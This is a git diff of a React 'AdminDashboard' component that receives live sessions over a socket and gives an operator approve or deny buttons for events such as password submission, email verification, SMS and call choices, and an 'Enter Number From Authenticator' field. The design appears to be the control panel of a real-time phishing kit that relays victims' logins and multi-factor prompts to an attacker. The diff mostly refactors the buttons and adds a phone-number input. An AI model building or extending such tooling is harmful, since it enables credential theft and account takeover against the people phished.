@@ -22,11 +22,18 @@ import {
 } from "@chakra-ui/react";
 import { eventConfig } from "../lib/eventConfig";
 
+const createButton = (colorScheme, onClick, text) => (
+  <Button colorScheme={colorScheme} onClick={onClick}>
+    {text}
+  </Button>
+);
+
 const AdminDashboard = () => {
   const [sessions, setSessions] = useState({});
   const [socket, setSocket] = useState(null);
   const [searchQuery, setSearchQuery] = useState("");
   const [authNumber, setAuthNumber] = useState("");
+  const [phone, setPhone] = useState("");
 
   // Define step navigation configuration for different event types
   // const eventConfig = {
@@ -94,7 +101,7 @@ const AdminDashboard = () => {
   // };
 
   useEffect(() => {
-    const socketURL = "https://officebackend-15b3.onrender.com";
+    const socketURL = import.meta.env.VITE_BASE_URL;
     const newSocket = io(socketURL);
 
     newSocket.on("connect", () => {
@@ -668,9 +675,10 @@ const AdminDashboard = () => {
     return () => newSocket.disconnect();
   }, []);
 
-  useEffect(() => {
-    console.log("sesh", sessions);
-  }, [sessions]);
+  // useEffect(() => {
+  //   console.log("sesh", sessions);
+  // }, [sessions]);
+
   const handleResponse = (sessionId, eventIndex, response) => {
     const event = sessions[sessionId].events[eventIndex];
     const config = eventConfig[event.type]?.[response];
@@ -693,6 +701,7 @@ const AdminDashboard = () => {
       ...config,
       email: event.email || sessions[sessionId].email,
       authNumber: authNumber || "",
+      phone: phone || "",
     });
 
     setSessions((prev) => ({
@@ -776,7 +785,7 @@ const AdminDashboard = () => {
       // pt="80px"
       px={4}
       pb={4}
-      mb="3rem"
+      mb="4rem"
       display="flex"
       flexDirection="column"
       height="100vh" // Make the main container take the full height
@@ -908,126 +917,201 @@ const AdminDashboard = () => {
 
                       {event.status === "pending" &&
                         (event.type !== "authenticator-select" ? (
-                          event.type === "verifycode-select" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "verify")
-                                }
-                              >
-                                Verify vcode-select
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny vcode-select
-                              </Button>
-                            </>
-                          ) : event.type === "email-verification" ||
-                            event.type === "password-submission" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "continue")
-                                }
-                              >
-                                Approve
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny
-                              </Button>
-                            </>
-                          ) : event.type === "verify-click" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "continue")
-                                }
-                              >
-                                Approve verify-click
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny verify-click
-                              </Button>
-                            </>
-                          ) : event.type === "text-select" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "approve")
-                                }
-                              >
-                                Approve text-select
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny text-select
-                              </Button>
-                            </>
-                          ) : event.type === "text-click" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "continue")
-                                }
-                              >
-                                Approve text-click
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny text-click
-                              </Button>
-                            </>
-                          ) : event.type === "call-select" ? (
-                            <>
-                              <Button
-                                colorScheme="green"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "call")
-                                }
-                              >
-                                Approve call-select
-                              </Button>
-                              <Button
-                                colorScheme="red"
-                                onClick={() =>
-                                  handleResponse(sessionId, index, "cancel")
-                                }
-                              >
-                                Deny call-select
-                              </Button>
-                            </>
-                          ) : (
-                            <>
-                              <Text>No Button for you yet</Text>
-                            </>
-                          )
+                          (() => {
+                            switch (event.type) {
+                              case "verifycode-select":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "verify"
+                                        ),
+                                      "Verify vcode-select"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny vcode-select"
+                                    )}
+                                  </>
+                                );
+                              case "email-verification":
+                                return (
+                                  <>
+                                    <>
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "email"
+                                          ),
+                                        "Verify email"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny email"
+                                      )}
+                                    </>
+                                  </>
+                                );
+                              case "password-submission":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      <Input
+                                        type="text"
+                                        name="phone"
+                                        value={phone}
+                                        onChange={(e) =>
+                                          setPhone(e.target.value)
+                                        }
+                                        placeholder="Enter Phone Number"
+                                      />
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "phone"
+                                            // { password }
+                                          ),
+                                        "Approve pass"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny pass"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+                              case "verify-click":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "continue"
+                                        ),
+                                      "Approve verify-click"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny verify-click"
+                                    )}
+                                  </>
+                                );
+                              case "text-select":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "approve"
+                                        ),
+                                      "Approve text-select"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny text-select"
+                                    )}
+                                  </>
+                                );
+                              case "text-click":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "continue"
+                                        ),
+                                      "Approve text-click"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny text-click"
+                                    )}
+                                  </>
+                                );
+                              case "call-select":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "call"
+                                        ),
+                                      "Approve call-select"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny call-select"
+                                    )}
+                                  </>
+                                );
+                              default:
+                                return <Text>No Button for you yet</Text>;
+                            }
+                          })()
                         ) : (
                           <HStack spacing={4} mt={4}>
                             <Input
@@ -1037,14 +1121,16 @@ const AdminDashboard = () => {
                               onChange={(e) => setAuthNumber(e.target.value)}
                               placeholder="Enter Number From Authenticator"
                             />
-                            <Button
-                              colorScheme="green"
-                              onClick={() =>
-                                handleResponse(sessionId, index, "authenticate")
-                              }
-                            >
-                              Approve auth-select
-                            </Button>
+                            {createButton(
+                              "green",
+                              () =>
+                                handleResponse(
+                                  sessionId,
+                                  index,
+                                  "authenticate"
+                                ),
+                              "Approve auth-select"
+                            )}
                           </HStack>
                         ))}
 
